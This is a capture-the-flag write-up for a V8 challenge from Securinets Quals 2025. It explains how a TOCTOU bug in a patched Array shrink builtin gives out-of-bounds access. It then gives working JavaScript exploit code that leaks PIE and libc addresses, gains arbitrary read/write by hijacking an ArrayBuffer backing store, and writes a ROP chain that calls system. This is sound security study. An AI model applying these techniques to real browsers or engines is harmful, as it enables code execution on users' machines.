---
layout: single
title:  "Securinets Quals 2025: Sukunahikona (v8 Exploitation)"
date: 2025-10-07
classes: wide
tags:
  - Exploitation
  - Browser
---

I played Securinets Quals this weekend with Shellphish; we ended up placing 7th, qualifying us for finals! When I logged on to play, all of the released pwn was already solved or close to solved by @vy, except for the v8 challenge. Despite having never touched v8 pwn before, I decided to give it a go, and I managed to solve it. This is my writeup for that challenge :)

Here is the challenge description:

```
i ran out of descriptions . Just solve it ig ??!!
```

Which... wasn't very helpful.

It came with two files, "to\_give.zip" and "patch":
- [to_give.zip](/assets/securinets-sukunahikona/to_give.zip)
- [patch](/assets/securinets-sukunahikona/patch)


# Getting Started

Here are the contents of the "to\_give.zip" file:
```
docker-compose.yml
server/d8
server/args.gn
server/entrypoint.sh
server/flag.txt
server/REVISION
server/Dockerfile
server/server.py
server/snapshot_blob.bin
```

The most interesting thing here is the "d8" binary which is used to run a debug version of v8 called "d8" that lets us access a JavaScript REPL and run JS files. This d8 binary is what the patch file provided with the challenge is applied to and what we need to exploit.

The patch file is a little long just because I think somethine went wrong when the author created it so the diff kind of repeats itself. But when we look at it, the first change we see is this:

```diff
diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
index ea45a7ada6b..2552c286b60 100644
--- a/src/builtins/builtins-array.cc
+++ b/src/builtins/builtins-array.cc
@@ -624,6 +624,45 @@ BUILTIN(ArrayShift) {

   return GenericArrayShift(isolate, receiver, length);
 }
+BUILTIN(ArrayShrink) {
+  HandleScope scope(isolate);
+  Factory *factory = isolate->factory();
+  Handle<Object> receiver = args.receiver();
+
+  if (!IsJSArray(*receiver) || !HasOnlySimpleReceiverElements(isolate, Cast<JSArray>(*receiver))) {
+    THROW_NEW_ERROR_RETURN_FAILURE(
+      isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
+      factory->NewStringFromAsciiChecked("Oldest trick in the book"))
+    );
+  }
+
+  Handle<JSArray> array = Cast<JSArray>(receiver);
+
+  if (args.length() != 2) {
+    THROW_NEW_ERROR_RETURN_FAILURE(
+      isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
+      factory->NewStringFromAsciiChecked("specify length to shrink to "))
+    );
+  }
+
+
+  uint32_t old_len = static_cast<uint32_t>(Object::NumberValue(array->length()));
+
+  Handle<Object> new_len_obj;
+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, new_len_obj, Object::ToNumber(isolate, args.at(1)));
+  uint32_t new_len = static_cast<uint32_t>(Object::NumberValue(*new_len_obj));
+
+  if (new_len >= old_len){
+    THROW_NEW_ERROR_RETURN_FAILURE(
+      isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
+      factory->NewStringFromAsciiChecked("invalid length"))
+    );
+  }
+
+  array->set_length(Smi::FromInt(new_len));
+
+  return ReadOnlyRoots(isolate).undefined_value();
+}
```

What this patch does is add a builtin to arrays called "shrink" that takes one argument and resizes the array.
So you can do something like this:

```js
let arr = [1, 2, 3];
arr.shrink(1);
```

and this will resize the array to have a length of one.

At first glance this seems fine, but as my teammates @Bena and @elemental had realized, when the shrink function sets the length it doesn't actually change the number of elements it just updates the length parameter of the JSArray object.

```javascript
  array->set_length(Smi::FromInt(new_len)); // this is not correct
```

But this on it's own isn't that interesting, we just can't access the items beyond the end of the array length even though they still exist.

I learned from my teammates that we can visualize this behavior via the `%DebugPrint()` command if we pass `--allow-natives-syntax` to the d8 binary:

```js
./d8 --allow-natives-syntax
V8 version 12.8.0 (candidate)
d8> let arr = [1, 2, 3, 4];
undefined
d8> %DebugPrint(arr)
DebugPrint: 0x80d00042bbd: [JSArray]
 - map: 0x080d001caf45 <Map[16](PACKED_SMI_ELEMENTS)> [FastProperties]
 - prototype: 0x080d001cb1c5 <JSArray[0]>
 - elements: 0x080d001d3571 <FixedArray[4]> [PACKED_SMI_ELEMENTS (COW)]
 - length: 4
 - properties: 0x080d00000725 <FixedArray[0]>
 - All own properties (excluding elements): {
    0x80d00000d99: [String] in ReadOnlySpace: #length: 0x080d00025fed <AccessorInfo name= 0x080d00000d99 <String[6]: #length>, data= 0x080d00000069 <undefined>> (const accessor descriptor, attrs: [W__]), location: descriptor
 }
 - elements: 0x080d001d3571 <FixedArray[4]> {
           0: 1
           1: 2
           2: 3
           3: 4
 }
...
[1, 2, 3, 4]
d8> arr.shrink(1);
undefined
d8> %DebugPrint(arr)
DebugPrint: 0x80d00042bbd: [JSArray]
 - map: 0x080d001caf45 <Map[16](PACKED_SMI_ELEMENTS)> [FastProperties]
 - prototype: 0x080d001cb1c5 <JSArray[0]>
 - elements: 0x080d001d3571 <FixedArray[4]> [PACKED_SMI_ELEMENTS (COW)]
 - length: 1     <-------- LENGTH IS NOW ONE
 - properties: 0x080d00000725 <FixedArray[0]>
 - All own properties (excluding elements): {
    0x80d00000d99: [String] in ReadOnlySpace: #length: 0x080d00025fed <AccessorInfo name= 0x080d00000d99 <String[6]: #length>, data= 0x080d00000069 <undefined>> (const accessor descriptor, attrs: [W__]), location: descriptor
 }
 - elements: 0x080d001d3571 <FixedArray[4]> {  <------- NUMBER OF ELEMENTS IS jSTILL FOUR
           0: 1
           1: 2
           2: 3
           3: 4
 }
...
[1]
d8> arr[1]
undefined
```

At this point we were thinking it might be possible that the garbage collector could free these objects and we could somehow get UAF on them, and maybe there were other methods in v8 that operate on the number of elements rather than the length of the array. But it seemed like they wouldn't be garbage collected because they were still referenced in elements array on the JSArray object.

# Searching for Clues

I was pretty lost on how this code could be vulnerable... so I went searching for other writeups to see if I could find anything, and stumbled across a writeup for a similar challenge: [https://lyra.horse/blog/2024/05/exploiting-v8-at-openecsc/](https://lyra.horse/blog/2024/05/exploiting-v8-at-openecsc/).

Here is the patch for that challenge:


```cpp
BUILTIN(ArrayXor) {
  HandleScope scope(isolate);
  Factory *factory = isolate->factory();
  Handle<Object> receiver = args.receiver();
  if (!IsJSArray(*receiver) || !HasOnlySimpleReceiverElements(isolate, JSArray::cast(*receiver))) {
    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
      factory->NewStringFromAsciiChecked("Nope")));
  }
  Handle<JSArray> array = Handle<JSArray>::cast(receiver);
  ElementsKind kind = array->GetElementsKind();
  if (kind != PACKED_DOUBLE_ELEMENTS) {
    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
      factory->NewStringFromAsciiChecked("Array.xor needs array of double numbers")));
  }
  // Array.xor() needs exactly 1 argument
  if (args.length() != 2) {
    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
      factory->NewStringFromAsciiChecked("Array.xor needs exactly one argument")));
  }
  // Get array len
  uint32_t length = static_cast<uint32_t>(Object::Number(array->length()));
  // Get xor value
  Handle<Object> xor_val_obj;
  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, xor_val_obj, Object::ToNumber(isolate, args.at(1)));
  uint64_t xor_val = static_cast<uint64_t>(Object::Number(*xor_val_obj));
  // Ah yes, xoring doubles..
  Handle<FixedDoubleArray> elements(FixedDoubleArray::cast(array->elements()), isolate);
  FOR_WITH_HANDLE_SCOPE(isolate, uint32_t, i = 0, i, i < length, i++, {
    double x = elements->get_scalar(i);
    uint64_t result = (*(uint64_t*)&x) ^ xor_val;
    elements->set(i, *(double*)&result);
  });

  return ReadOnlyRoots(isolate).undefined_value();
}
```

This is very similar, it does the same kind of checks to make sure the builtin is being called on a JSArray and then casts the argument to a Number type. The author of this writeup exploits a TOCTOU this code by setting a 'valueOf' property on a Map type:

```js
evil = {
     valueOf: () => {
       arr[0] = {};
       return 1337;
     }
   }
```

This allows her to modify the array the builtin is called on after the code checks that the array only contains doubles and get it to do the xor operation on a map object, corrupting the pointer to the object.

# Snap Back to Reality

Now, back to the challenge we are working on, it turns out we can do something pretty similar:

```cpp
  // read length of array
  uint32_t old_len = static_cast<uint32_t>(Object::NumberValue(array->length()));

  // argument is casted to a number type, we can remove elements in a valueOf method from the array and still return whatever length we want new_len to be
  Handle<Object> new_len_obj;
  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, new_len_obj, Object::ToNumber(isolate, args.at(1)));
  uint32_t new_len = static_cast<uint32_t>(Object::NumberValue(*new_len_obj));

  // checks against old_len which was read before we modified the array in the valueOf method
  // if we remove all elements from the array but then return new_len as old_len-1 we still pass this check
  if (new_len >= old_len){
    THROW_NEW_ERROR_RETURN_FAILURE(
      isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
      factory->NewStringFromAsciiChecked("invalid length"))
    );
  }

  array->set_length(Smi::FromInt(new_len));
```

Here is a small PoC I used to demonstrate it was possible to trigger this bug:
```js
arr = new Array(2000).fill({});
evil = { valueOf() { for (let i = 0; i < 1999; i++) { arr.pop(); } return 1999; } };
arr.shrink(evil)
%DebugPrint(arr);
```

This is the output:
```js
DebugPrint: 0x4ec00042bb9: [JSArray]
 - map: 0x04ec001cb92d <Map[16](HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x04ec001cb1c5 <JSArray[0]>
 - elements: 0x04ec00042bc9 <FixedArray[18]> [HOLEY_ELEMENTS]
 - length: 1999
 - properties: 0x04ec00000725 <FixedArray[0]>
 - All own properties (excluding elements): {
    0x4ec00000d99: [String] in ReadOnlySpace: #length: 0x04ec00025fed <AccessorInfo name= 0x04ec00000d99 <String[6]: #length>, data= 0x04ec00000069 <undefined>> (const accessor descriptor, attrs: [W__]), location: descriptor
 }
 - elements: 0x04ec00042bc9 <FixedArray[18]> {
           0: 0x04ec00044b11 <Object map = 0x4ec001c0f6d>
        1-17: 0x04ec00000741 <the_hole_value>
 }
 ...
 ```

Notice that the length is 1999, while the number of elements in the JSArray is only 18.

If I try and access one index past the end of the elements list, I get a crash:
```js
d8> arr[18]
abort: Unexpected instance type encountered

==== JS stack trace =========================================

    0: ExitFrame [pc: 0x61c163bedbf6]
    1: StubFrame [pc: 0x61c163b5398f]
    2: Stringify(aka Stringify) [0x4ec0004570d] [d8-stringify:~23] [pc=0x61c1c3b401ce](this=0x04ec00000069 <undefined>,0x04ec00000971 <Map(FREE_SPACE_TYPE)>#0#,4)
    3: InternalFrame [pc: 0x61c163b4e01c]
    4: EntryFrame [pc: 0x61c163b4dd5f]
```

Which seems good?

My teammates also shared this writeup [https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/](https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/) in which they are given an out-of-bounds primitive and use an array of double type elements to do out-of-bounds reads and writes. I borrowed some helper methods for converting between floats and integers from them.

Here is a modified PoC using doubles and the helper methods:
```js
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { f64_buf[0] = val; return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); }
function itof(val) { u64_buf[0] = Number(val & 0xffffffffn); u64_buf[1] = Number(val >> 32n); return f64_buf[0]; }

arr = new Array(2000).fill(1.1);
evil = { valueOf() { for (let i = 0; i < 1999; i++) { arr.pop(); } return 1999; } };
for (let i = 17; i < 27; i++) { console.log('before ' + i + ': 0x' + ftoi(arr[i]).toString(16)); }
arr.shrink(evil)
for (let i = 17; i < 27; i++) { console.log('after ' + i + ': 0x' + ftoi(arr[i]).toString(16)); }
```

this produces output that looks like this:
```
d8> before 0: 0x3ff199999999999a
before 1: 0x3ff199999999999a
before 2: 0x3ff199999999999a
before 3: 0x3ff199999999999a
before 4: 0x3ff199999999999a
before 5: 0x3ff199999999999a
before 6: 0x3ff199999999999a
before 7: 0x3ff199999999999a
before 8: 0x3ff199999999999a
before 9: 0x3ff199999999999a
before 10: 0x3ff199999999999a
before 11: 0x3ff199999999999a
before 12: 0x3ff199999999999a
before 13: 0x3ff199999999999a
before 14: 0x3ff199999999999a
before 15: 0x3ff199999999999a
before 16: 0x3ff199999999999a
before 17: 0x3ff199999999999a
before 18: 0x3ff199999999999a
before 19: 0x3ff199999999999a
undefined
d8> undefined
d8> after 0: 0x3ff199999999999a
after 1: 0x7ff8000000000000
after 2: 0x7ff8000000000000
after 3: 0x7ff8000000000000
after 4: 0x7ff8000000000000
after 5: 0x7ff8000000000000
after 6: 0x7ff8000000000000
after 7: 0x7ff8000000000000
after 8: 0x7ff8000000000000
after 9: 0x7ff8000000000000
after 10: 0x7ff8000000000000
after 11: 0x7ff8000000000000
after 12: 0x7ff8000000000000
after 13: 0x7ff8000000000000
after 14: 0x7ff8000000000000
after 15: 0x7ff8000000000000
after 16: 0x7ff8000000000000
after 17: 0x7ff8000000000000
after 18: 0xc000000971
after 19: 0x7ff8000000000000
undefined
d8>
```
So we are now able to view data out-of-bounds of our array, most of which looks the same, this is probably related to `the_hole_value`, the value javascript uses as a filler element when resizing arrays. These elements were just recently freed though, so I figured we should see if we can reclaim them.

I have no idea how the allocator works in v8 so I just tried allocating a ton of arrays to see if eventually it would get reclaimed by other data:

```js
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { f64_buf[0] = val; return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); }
function itof(val) { u64_buf[0] = Number(val & 0xffffffffn); u64_buf[1] = Number(val >> 32n); return f64_buf[0]; }

arr = new Array(2000).fill(1.1);
evil = { valueOf() { for (let i = 0; i < 1999; i++) { arr.pop(); } return 1999; } };
arr.shrink(evil)

let arrs = [];
for (let i = 0; i < 50000; i++) { arrs.push([1.1]); }

for (let i = 0; i < 50; i++) { console.log('after ' + i + ': 0x' + ftoi(arr[i]).toString(16)); }
```

And here was the result:
```
after 0: 0x3ff199999999999a
...
after 18: 0xc00000999
after 19: 0x1d1fb900280dad
after 20: 0x1d2165001d20a5
after 21: 0x6900000069
after 22: 0x600000999
after 23: 0x1d1fb900280dad
after 24: 0x859001d20a5
after 25: 0x5555566c8830
after 26: 0x4000005e5
after 27: 0x1d40bfbe1be82a
after 28: 0x4000005e5
after 29: 0x1d477b3bd65d3c
after 30: 0x4000005e5
after 31: 0x1d34bbe5445d68
after 32: 0x4000005e5
after 33: 0x1d360f9984896a
after 34: 0x4000005e5
after 35: 0x1d50437afb5294
after 36: 0x4000005e5
after 37: 0x1d515fb3f73494
after 38: 0x4000005e5
after 39: 0x1d4c176c4c35ac
after 40: 0x4000005e5
after 41: 0x1d45c727042db2
after 42: 0x4000005e5
after 43: 0x1d43e3d15d1ab6
after 44: 0x4000005e5
after 45: 0x1d4e8bbd48c1c4
after 46: 0x4000005e5
after 47: 0x1d41e34b5b94ce
after 48: 0x4000005e5
after 49: 0x1d4307b55068e6
```

# Control Flow Hijacking?

Wildly, there is actually a code pointer in that output at index 25 `0x5555566c8830` which points to `v8::PrintMessageCallback`.
We can actually just overwite this and get control flow hijacking when an error occurs in the repl:

```js
d8> arr[25] = itof(BigInt(0xdeadbeef));
d8> console.log(ftoi(arr[25]).toString(16))
d8> meow // this is undefined so the repl errors

Thread 1 "d8" received signal SIGSEGV, Segmentation fault.
0x00000000deadbeef in ?? ()
-------------------------------------------------------------------------------------------------- code:x86:64 ----
[!] Cannot access memory at address 0xdeadbeef
-------------------------------------------------------------------------------------------------------------------
gef>
```

I tried exploiting this for a while, but the register state at the control flow hijacking site wasn't great for achieving any kind of stack pivot.

# Arb Read/Write

Looking back this writeup [https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/](https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/), they hijacked a pointer to the `backing_store` of an ArrayBuffer object.
So I figured I'd try just spraying ArrayBuffers and see if I can just directly edit their backing store using the OOB I have.

Frustratingly, there is different behavior between running `./d8 <js_file_path>` versus `./d8` and sending input to the REPL, so from this point on I use the prior method to be consistent with remote.

```js
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { f64_buf[0] = val; return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); }

function itof(val) { u64_buf[0] = Number(val & 0xffffffffn); u64_buf[1] = Number(val >> 32n); return f64_buf[0]; }

let arr = new Array(2000).fill(1.1);
evil = { valueOf() { for (let i = 0; i < 1999; i++) { arr.pop(); } return 1999; } };
arr.shrink(evil)

let arrs = new Array()
for (let i = 0; i < 100000; i++) { arrs.push(new ArrayBuffer(8)); }

for (let i = 0; i < 100; i++) { console.log(i + ': 0x' + ftoi(arr[i]).toString(16)); }

// OUT:
// ...
// 25: 0x5555566c8830
// ...
// 30: 0x57ef24d000000000
// 31: 0x22800000005555
```

Turns out spraying 100000 ArrayBuffers was enough to reclaim the memory of our array elements! The code pointer is still there and at index 30/31 there is actually a misaligned heap pointer:

```
gef> vmmap 0x555557ef24d0
[ Legend:  Code | Heap | Stack | Writable | ReadOnly | None | RWX ]
Start              End                Size               Offset             Perm Path
0x0000555557e50000 0x00005555594cb000 0x000000000167b000 0x0000000000000000 rw- [heap]
```

This is very likely to be a `backing_store` field of one of the ArrayBuffers we allocated.

I confirmed this by doing `%DebugPrint(arrs[0])` and seeing that the `backing_store` pointer matched the one that was leaked.


```
DebugPrint: 0x234e00280021: [JSArrayBuffer] in OldSpace
 - map: 0x234e001c87b9 <Map[56](HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x234e001c894d <Object map = 0x234e001c87e1>
 - elements: 0x234e00000725 <FixedArray[0]> [HOLEY_ELEMENTS]
 - cpp_heap_wrappable: 0
 - backing_store: 0x555557ef24d0 <--- matches pointer from leak
 - byte_length: 8
 - max_byte_length: 8
...
```

According to [this](https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/) we can overwrite the pointer and get arb/read write by wrapping it in a DataView:

```js
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { f64_buf[0] = val; return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); }

function itof(val) { u64_buf[0] = Number(val & 0xffffffffn); u64_buf[1] = Number(val >> 32n); return f64_buf[0]; }

let arr = new Array(2000).fill(1.1);
evil = { valueOf() { for (let i = 0; i < 1999; i++) { arr.pop(); } return 1999; } };
arr.shrink(evil)

let arrs = new Array()

// allocate until we see the code pointer in idx 25
let idx_25 = ftoi(arr[25]);
while ((idx_25 & 0xfffn) != 0x830n) {
  arrs.push(new ArrayBuffer(8));
  idx_25 = ftoi(arr[25]);
}

// allocate until we see something that looks sorta like a heap pointer in idx 31
let idx_31 = ftoi(arr[31]);
while ((idx_31 & 0xf000n) != 0x5000n && (idx_31 & 0xf000n) != 0x6000n) {
  arrs.push(new ArrayBuffer(8));
  idx_31 = ftoi(arr[31]);
}

// Leak the code pointer
let pie_leak = ftoi(arr[25]);
console.log('PIE Leak: 0x' + pie_leak.toString(16));

// Calculate base address of d8 binary
let pie_base = pie_leak - BigInt(0x1174830);
console.log('PIE Base: 0x' + pie_base.toString(16));

// Leak the backing_store pointer of the arrs[0] DataView
let backing_store = (ftoi(arr[30]) >> 32n) + ((ftoi(arr[31]) & 0xffffffffn) << 32n);
console.log('backing_store: 0x' + backing_store.toString(16));

let dataview = new DataView(arrs[0]);

// Address in GOT we want to leak
got_pkey_set = pie_base + BigInt(0x28ab9d8);
console.log("got_pkey_set: " +  got_pkey_set.toString(16));

// Overwrite backing_store pointer
arr[30] = itof((BigInt(got_pkey_set & 0xffffffffn) << 32n));
arr[31] = itof(got_pkey_set >> 32n);

let libc_pkey_set = dataview.getBigUint64(0, true);
console.log("libc_pkey_set: " +  libc_pkey_set.toString(16));

// OUT:
// PIE Leak: 0x5e0325bbe830
// PIE Base: 0x5e0324a4a000
// backing_store: 0x5e03323ad4d0
// got_pkey_set: 5e03272f59d8
// libc_pkey_set: 7b060ff26290
```

Unfortunately, this code only works maybe once in four tries for reasons that are beyond my comprehension.

Regardless, we now have arbitrary read/write by using either `dataview.getBigUint64` or `dataview.setBigUint64`!

With this, I finished the exploit off by leaking `environ` from libc to get a stack pointer and overwriting the stack with a ROP chain:

```js
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { f64_buf[0] = val; return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); }

function itof(val) { u64_buf[0] = Number(val & 0xffffffffn); u64_buf[1] = Number(val >> 32n); return f64_buf[0]; }

let arr = new Array(2000).fill(1.1);
evil = { valueOf() { for (let i = 0; i < 1999; i++) { arr.pop(); } return 1999; } };
arr.shrink(evil)

let arrs = new Array()

let idx_25 = ftoi(arr[25]);
while ((idx_25 & 0xfffn) != 0x830n) {
  arrs.push(new ArrayBuffer(8));
  idx_25 = ftoi(arr[25]);
}

let idx_31 = ftoi(arr[31]);
while ((idx_31 & 0xf000n) != 0x5000n && (idx_31 & 0xf000n) != 0x6000n) {
  arrs.push(new ArrayBuffer(8));
  idx_31 = ftoi(arr[31]);
}

// Leak the code pointer we saw at idx 25
let pie_leak = ftoi(arr[25]);
console.log('PIE Leak: 0x' + pie_leak.toString(16));

// Calculate base address of d8 binary
let pie_base = pie_leak - BigInt(0x1174830);
console.log('PIE Base: 0x' + pie_base.toString(16));

// Leak the backing_store pointer of the arrs[0] DataView
let backing_store = (ftoi(arr[30]) >> 32n) + ((ftoi(arr[31]) & 0xffffffffn) << 32n);
console.log('backing_store: 0x' + backing_store.toString(16));

let dataview = new DataView(arrs[0]);

// Address in GOT we want to leak
got_pkey_set = pie_base + BigInt(0x28ab9d8);
console.log("got_pkey_set: " +  got_pkey_set.toString(16));

// Overwrite backing_store pointer
arr[30] = itof((BigInt(got_pkey_set & 0xffffffffn) << 32n));
arr[31] = itof(got_pkey_set >> 32n);

let libc_pkey_set = dataview.getBigUint64(0, true);
console.log("libc_pkey_set: " +  libc_pkey_set.toString(16));

let libc_base = libc_pkey_set - BigInt(0x12a530);
console.log("libc Base: " +  libc_base.toString(16))

let environ  = libc_base + BigInt(0x20ad58);
console.log("environ: " +  environ.toString(16))

arr[30] = itof((BigInt(environ & 0xffffffffn) << 32n));
arr[31] = itof(environ >> 32n);

let sp_leak = dataview.getBigUint64(0, true);
console.log("sp_leak: 0x" +  sp_leak.toString(16));
console.log("weh");

let sp_target = sp_leak - BigInt(0x138)
console.log("sp_target: 0x" +  sp_target.toString(16));

// flag is at ./flag.txt, so write 'cat f*\0' somewhere for system()
let cmd_str = sp_leak - BigInt(0x100)
arr[30] = itof((BigInt(cmd_str & 0xffffffffn) << 32n));
arr[31] = itof(cmd_str >> 32n);
console.log("cmd_str = 0x" + cmd_str.toString(16));
dataview.setBigUint64(0, BigInt(0x20746163) + (BigInt(0x2a66) << 32n), true);

let system = libc_base + BigInt(0x58750);
let pop_rdi = libc_base + BigInt(0x000000000010f78b);

// ret
arr[30] = itof((BigInt(sp_target & 0xffffffffn) << 32n));
arr[31] = itof(sp_target >> 32n);
let ret = pop_rdi + BigInt(1);
console.log("ret = 0x" + ret.toString(16));
dataview.setBigUint64(0, ret, true);

// pop rdi
sp_target += 8n;
arr[30] = itof((BigInt(sp_target & 0xffffffffn) << 32n));
arr[31] = itof(sp_target >> 32n);
console.log("pop_rdi = 0x" + pop_rdi.toString(16));
dataview.setBigUint64(0, pop_rdi, true);

// cmd_str
sp_target += 8n;
arr[30] = itof((BigInt(sp_target & 0xffffffffn) << 32n));
arr[31] = itof(sp_target >> 32n);
let binsh = libc_base + BigInt(0x1cb42f);
dataview.setBigUint64(0, cmd_str, true);

// system
sp_target += 8n;
arr[30] = itof((BigInt(sp_target & 0xffffffffn) << 32n));
arr[31] = itof(sp_target >> 32n);
dataview.setBigUint64(0, system, true);

// Securinets{shrink_is_op}
```

I encountered *a lot* of issues with differences in behavior when running the exploit directly against d8 on my host versus in the provided container and running d8 under GDB versus running it directly. Eventually, I got it working though!

Thanks for reading! I learned a ton while working on this challenge but I am still an absolute noob at v8, hopefully my writeup is coherent :p

I'm looking forwards to working on more v8 challenges in the future :)
